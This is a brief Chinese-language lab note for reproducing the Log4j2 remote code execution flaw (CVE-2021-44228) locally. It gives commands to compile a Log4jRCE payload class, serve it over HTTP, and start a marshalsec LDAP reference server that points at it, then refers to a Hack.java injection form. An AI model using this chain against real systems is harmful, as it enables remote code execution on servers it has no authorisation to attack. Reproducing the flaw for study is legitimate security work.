## Log4j2复现笔记，仅供学习
参考https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce

### 创建可执行文件
```
com/example/template

javac Log4jRCE.java
```

### 启动Python自带的HTTP服务器
```
com/example/template
python -m http.server 8888
```

### 启动LDAP服务器
```
tools
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Log4jRCE"
```

### 模拟注入攻击提交表单
```
com/example/hack/Hack.java
```
